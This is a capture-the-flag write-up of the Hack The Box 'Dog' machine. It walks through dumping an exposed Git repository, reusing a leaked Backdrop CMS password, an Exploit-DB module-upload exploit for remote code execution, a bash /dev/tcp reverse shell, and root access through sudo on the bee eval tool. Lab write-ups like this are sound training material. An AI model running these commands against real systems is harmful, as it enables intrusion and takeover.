# 🐾 Hack The Box - Dog
![Screenshot](https://imgur.com/7MgR1KL.png)

### 🌐 Machine Information
- **IP:**  10.10.11.58
- **OS:** Linux

### 🧭 Information Gathering
- I begin by scanning the target machine using Nmap to identify open ports and running services: `nmap -A -p- 10.10.11.58 -oN nmap_scan`
![Screenshot](https://imgur.com/MNXz0uh.png)
- Nmap Results 2 open ports and 1 interesting finding: `22 (ssh)`, `80 (HTTP)` and `.git` is exposed
- To make the domain easier to access, I added the following line to /etc/hosts: `10.10.11.58 dog.htb`
![Screenshot](https://imgur.com/aBtUadM.png)
- Browsing to http://dog.htb, I found a Backdrop CMS login page
![Screenshot](https://imgur.com/K84alMF.png)

### 📂 Git Repository Dump & Initial Access
- Since the .git directory was publicly accessible, I used git-dumper to retrieve the full source code: `git-dumper http://dog.htb gitdump`
![Screenshot](https://imgur.com/m1CD9uj.png)
- Once dumped, I reviewed the contents and discovered database credentials in `settings.php` 
![Screenshot](https://imgur.com/nE3dinF.png)
- I then searched the codebase for email addresses using: `grep -rn "dog"`
- This revealed an email address
![Screenshot](https://imgur.com/hpfeNIb.png)
- I attempted to log into the CMS using the email and the MySQL password found earlier: `tiffany@dog.htb:BackDropJ2024DS2024`
![Screenshot](https://imgur.com/DKYpuzX.png)
- It worked.

### 🧩 Identifying CMS Version & Exploiting RCE
- After logging in, I navigated to the CMS status page: `http://dog.htb/?q=admin/reports/status`
![Screenshot](https://imgur.com/tPFSSoT.png)
- The version identified was Backdrop CMS 1.27.1
- Using searchsploit, I looked for known vulnerabilities: `searchsploit backdrop 1.27.1`
![Screenshot](https://imgur.com/S08xDJK.png)
- One exploit offered remote code execution (RCE). I used the script from Exploit-DB (Locate it through the path provided by searchsploit): `python3 52021.py http://dog.htb`
![Screenshot](https://imgur.com/50sfPPU.png)
- Before uploading the malicious module, I modified the module info (the file with the .info extension) for easy identification. 
- Before:

  ![Screenshot](https://imgur.com/XSbZoYD.png)
- After:

  ![Screenshot](https://imgur.com/oZEDlWu,png)
- I then manually uploaded it at: `http://dog.htb/?q=admin/installer/manual`
![Screenshot](https://imgur.com/5yAEwk2.png)
**Note:** I converted the zip file to .tar.gz, as .zip uploads were blocked.
![Screenshot](https://imgur.com/pWAoHIF.png)
- Once installed, I accessed the shell via: `http://dog.htb/modules/shell/shell.php`
![Screenshot](https://imgur.com/pdKzR0W.png)
- To get a reverse shell on my local machine i used this method:
Attacker (listener): `nc -lvnp 4444`
Target (shell): `bash -c 'bash -i >& /dev/tcp/10.10.14.9/4444 0>&1'`
**Note:** `10.10.14.9` is my ip
![Screenshot](https://imgur.com/8Dg5EWG.png)

### 👤 Privilege Escalation to User
- In `/home`, there were two users: `jobert` and `johncusack`. The `user flag` belonged to `johncusack`, but I didn't have direct access.
![Screenshot](https://imgur.com/BToevl6.png)
- I tried switching users with the database password found earlier: `su johncusack`

  ![Screenshot](https://imgur.com/3b388rm.png)
- It worked. After switching, I upgraded the shell for better usability: `script /dev/null -c bash`
- I then accessed the user flag.

  ![Screenshot](https://imgur.com/wmXeXqT.png)

### 🔐 Privilege Escalation to Root
- Running `sudo -l` revealed: `(ALL) NOPASSWD: /usr/local/bin/bee`
![Screenshot](https://imgur.com/yAoWqxL.png)
- Executing `bee` showed a PHP evaluation tool. One of its features, `eval`, allowed arbitrary PHP execution. 
![Screenshot](https://imgur.com/8qtDuGn.png)
- My initial attempt failed because it required a valid project root.
![Screenshot](https://imgur.com/t7NgCYy.png)
- After some trial and error, I found the correct usage: `sudo /usr/local/bin/bee --root=/var/www/html eval 'system("bash");'`
- It turns out I had to specify the Backdrop root directory, which is where the Backdrop CMS is located: `/var/www/html`
![Screenshot](https://imgur.com/4i9nzQS.png)
- This granted a root shell. From there, I read the root.txt and captured the root flag.

  ![Screenshot](https://imgur.com/thbiBzV.png)

